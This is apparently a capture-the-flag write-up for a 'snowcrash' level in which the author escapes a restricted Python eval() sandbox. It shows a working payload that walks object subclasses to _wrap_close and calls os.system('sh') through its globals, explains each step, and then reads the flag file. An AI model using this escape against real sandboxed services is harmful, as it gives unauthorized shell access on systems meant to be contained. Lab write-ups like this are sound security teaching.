# Level 07

We are stuck in a restricted Python shell (sandbox) and need to escape.

## 1. Environment Analysis

Testing command execution reveals that `print()` works, but core builtins and shell operators are blocked or split by whitespace:

```bash
level07@snowcrash:~$ print("hello")
hello
level07@snowcrash:~$ __import__('os').system('sh')
Validator: name '__import__' is not defined
level07@snowcrash:~$ ls ; sh
Validator: ls: cannot access ';': No such file or directory
```

This confirms a Python `eval()` sandbox with heavily restricted `__builtins__`.

## 2. Sandbox Inspection & Jailbreak

We can inspect currently loaded memory modules using `__subclasses__()`. The output includes `prisonlib` classes, confirming the sandbox layer:

```bash
level07@snowcrash:~$ [].__class__.__base__.__subclasses__()
... <class 'prisonlib._NodeBase'>, <class 'prisonlib._RegistryMixin'> ...
```

Since native methods like `__import__` and `open` are completely removed, we must find a loaded class that retains access to the `os` module or its underlying system functions. 

We can target the `_wrap_close` class, which uses `os` internally, to retrieve the original `os.system` function via its global variables:

```bash
level07@snowcrash:~$ [c for c in [].__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close'][0].__init__.__globals__['system']('sh')
$
```

### Explaining the Payload:
* `[]` – Creates an empty list.
* `.__class__.__base__` – Navigates up to the root `object` class.
* `.__subclasses__()` – Lists all Python classes loaded in memory.
* `if c.__name__ == '_wrap_close'` – Filters for the specific internal class that references `os`.
* `.__init__.__globals__['system']` – Accesses the hidden global dictionary of the class to extract the raw `os.system` method.
* `('sh')` – Executes a standard shell.

## 3. Retrieving the Flag

We successfully escaped the Python jail into a real shell. We can now read the flag:

```bash
\$ cat /home/flag07/.flag
```